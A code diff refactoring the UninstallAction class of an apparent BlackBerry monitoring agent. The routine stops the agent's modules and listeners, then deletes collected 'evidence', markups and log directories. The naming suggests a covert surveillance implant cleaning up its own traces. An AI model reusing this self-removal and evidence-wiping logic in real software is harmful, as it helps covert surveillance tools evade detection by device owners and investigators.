@@ -11,25 +11,25 @@ package blackberry.action;
 import net.rim.device.api.system.Application;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
-import blackberry.AgentManager;
-import blackberry.EventManager;
 import blackberry.Main;
+import blackberry.Status;
+import blackberry.Trigger;
 import blackberry.config.Conf;
-import blackberry.debug.Check;
+import blackberry.config.ConfAction;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.evidence.Markup;
+import blackberry.manager.EventManager;
+import blackberry.manager.ModuleManager;
 import blackberry.utils.Utils;
 
 /**
  * The Class UninstallAction.
  */
-public final class UninstallAction extends SubAction {
+public final class UninstallAction extends SubActionMain {
     //#ifdef DEBUG
     static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
-
     //#endif
 
     /**
@@ -40,36 +40,17 @@ public final class UninstallAction extends SubAction {
      * @param confParams
      *            the conf params
      */
-    public UninstallAction(final int actionId_, final byte[] confParams) {
-        super(actionId_);
-        parse(confParams);
-
-        //#ifdef DBC
-        Check.requires(actionId == ACTION_UNINSTALL, "Wrong ActionId");
-        //#endif
+    public UninstallAction(final ConfAction params) {
+        super(params);
+    }
+    
+    protected boolean parse(ConfAction params) {
+        return true;
     }
 
-    /**
-     * Instantiates a new uninstall action.
-     * 
-     * @param host
-     *            the host
-     */
-    public UninstallAction(final String host) {
-        super(ACTION_UNINSTALL);
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
-     */
-    public boolean execute(final Event triggeringEvent) {
-        //#ifdef DEBUG
-        debug.info("execute");
-        //#endif
-        wantUninstall = true;
-
-        return actualExecute();
+    public boolean execute(Trigger trigger) {
+        Status.self().uninstall=true;
+        return true;
     }
 
     public static boolean actualExecute() {
@@ -86,7 +67,7 @@ public final class UninstallAction extends SubAction {
             final Main main = (Main) Application.getApplication();
             main.stopListeners();
 
-            AgentManager.getInstance().stopAll();
+            ModuleManager.getInstance().stopAll();
             EventManager.getInstance().stopAll();
 
             Utils.sleep(5000);
@@ -174,7 +155,7 @@ public final class UninstallAction extends SubAction {
             //#endif
             EvidenceCollector.getInstance().removeProgressive();
             Markup.removeMarkups();
-            EvidenceCollector.getInstance().removeLogDirs(Integer.MAX_VALUE);
+            int removed=EvidenceCollector.getInstance().removeLogDirs(Integer.MAX_VALUE);
 
             //#ifdef DEBUG
             CodeModuleManager.promptForResetIfRequired();
@@ -188,16 +169,7 @@ public final class UninstallAction extends SubAction {
         return true;
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.action.SubAction#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParams) {
-        //#ifdef DBC
-        Check.requires(confParams.length == 0, "params should be empty");
-        //#endif
-        return true;
-    }
+
 
     //#ifdef DEBUG
     public String toString() {
